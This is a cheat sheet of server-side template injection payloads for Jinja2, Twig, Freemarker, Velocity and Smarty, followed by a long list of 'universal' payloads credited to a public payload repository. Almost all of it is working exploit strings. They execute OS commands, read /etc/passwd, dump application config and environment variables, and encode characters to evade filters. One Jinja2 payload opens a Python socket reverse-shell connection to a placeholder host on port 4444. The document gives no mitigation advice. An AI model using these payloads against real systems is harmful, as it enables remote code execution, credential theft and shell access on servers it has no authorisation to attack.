STI happens when user input is embedded in templates and evaluated without proper sanitization, leading to code execution, data leaks, or shells in some cases.

# Common Template Engines & Payloads

## Jinja2 (Python — Flask, Django)
Detect:
```
{{7*7}} → 49
```
Exploit:
```
{{config.items()}}                             # Dump config
{{''.__class__.__mro__[1].__subclasses__()}}   # Access all subclasses
{{''.join(c.__name__ for c in ().__class__.__base__.__subclasses__())}}  # Dump class names
{{''.__class__.__mro__[1].__subclasses__()[59]('/etc/passwd').read()}}   # Read file (if subclass index matches <open>)
```
## Twig (PHP — Symfony, Laravel)
Detect:
```
{{7*7}} → 49
```
Exploit:
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id").getCallable()("id")}}
```
## Freemarker (Java — Spring, JSP, Struts)
Detect:
```
${7*7} → 49
```
Exploit:
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```
## Velocity (Java)
Detect:
```
#set($a = 7 * 7) $a → 49
```
Exploit:
```
#set($e="".getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
```
## Smarty (PHP)
Detect:
```
{7*7} → 49
```
Exploit:
```
{php}echo system('id');{/php}
```

# Universal Payloads:

Credits: https://github.com/payloadbox/ssti-payloads
```
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}

```

References:

https://redfoxsec.com/blog/a-guide-to-server-side-template-injection-ssti/
https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
